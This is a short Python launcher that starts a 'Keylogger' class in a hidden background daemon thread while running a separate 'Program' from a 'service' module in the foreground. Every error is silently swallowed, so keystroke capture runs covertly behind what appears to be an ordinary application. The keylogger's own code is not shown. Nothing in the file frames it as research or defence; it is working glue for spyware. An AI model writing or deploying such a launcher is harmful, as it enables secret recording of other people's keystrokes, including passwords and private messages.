import sys
import os
import threading
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from keylogger import Keylogger
from service import Program

def run_keylogger():
    try:
        kl = Keylogger()
        kl.start()
        while True:
            time.sleep(1)
    except Exception as e:
        pass

def main():
    threading.Thread(target=run_keylogger, daemon=True).start()
    time.sleep(0.5)
    try:
        Program().run()
    except Exception as e:
        pass

if __name__ == "__main__":
    main()
